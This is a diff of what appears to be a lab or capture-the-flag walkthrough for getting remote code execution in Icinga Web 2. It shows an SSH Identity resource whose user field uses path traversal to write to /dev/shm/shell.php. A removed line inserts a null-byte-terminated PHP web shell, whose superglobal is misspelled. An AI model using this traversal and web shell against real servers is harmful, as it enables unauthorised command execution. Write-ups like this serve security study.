@@ -93,5 +93,7 @@ Now to get rce we need to create another resource
 Resource Type: SSH Identity
 Resource Name: shell.php
 User:../../../../../../dev/shm/shell.php
-Private Key: file:///etc/icingaweb2/ssh/haxor%00 <?php system($GET_['cmd']);?>
+Private Key: file:///etc/icingaweb2/ssh/haxor
 ```
+
+So we intercept the request in burp
